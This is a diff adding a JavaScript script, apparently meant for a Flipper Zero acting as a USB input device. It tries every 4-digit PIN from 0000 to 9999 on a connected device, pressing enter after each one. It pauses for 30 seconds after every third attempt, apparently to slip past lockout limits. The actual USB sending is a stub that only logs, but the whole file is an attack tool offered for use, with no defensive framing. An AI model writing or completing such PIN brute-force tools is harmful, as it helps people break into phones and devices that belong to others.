@@ -1,0 +1,54 @@
+// Simulating the sending of USB commands via Flipper Zero or connected USB device.
+// This assumes you have a USB interface available to send commands through.
+
+function sendUSBCommand(command) {
+    console.log("Sending USB command: " + command);
+    // Simulate the USB command being sent
+    // You can replace this with actual logic to send commands to the USB device
+    // Example: using WebUSB or Node.js's usb/serialport libraries to send commands
+}
+
+async function bruteForcePIN() {
+    let delayCount = 0;
+
+    for (let i = 0; i <= 9999; i++) {
+        // Format the number to 4 digits with leading zeros (e.g., 0000, 0001, 9999)
+        let pin = i.toString().padStart(4, '0');
+        
+        try {
+            // Construct a USB command to send the PIN to the connected device
+            let usbCommand = "usb send " + pin;  // Replace with actual Flipper USB send command
+            sendUSBCommand(usbCommand);
+
+            // Simulate pressing 'Enter' after inputting the PIN
+            let usbEnterCommand = "usb send enter";  // Replace with actual Flipper USB enter command
+            sendUSBCommand(usbEnterCommand);
+
+            console.log("Attempted PIN: " + pin);
+
+            delayCount++;
+
+            // Introduce a delay every third attempt
+            if (delayCount % 3 === 0) {
+                console.log("Pausing for 30 seconds...");
+                await sleep(30000);  // Sleep function in Flipper Zero (30-second pause)
+            }
+
+            // Additional delay between each attempt (optional)
+            await sleep(1000);  // Optional: sleep 1 second between each attempt for rate-limiting
+
+        } catch (error) {
+            console.error("Error sending USB command: ", error);
+        }
+    }
+
+    console.log("Brute force attempts completed.");
+}
+
+// Asynchronous sleep function to introduce delays in execution
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Start the brute force process
+bruteForcePIN();
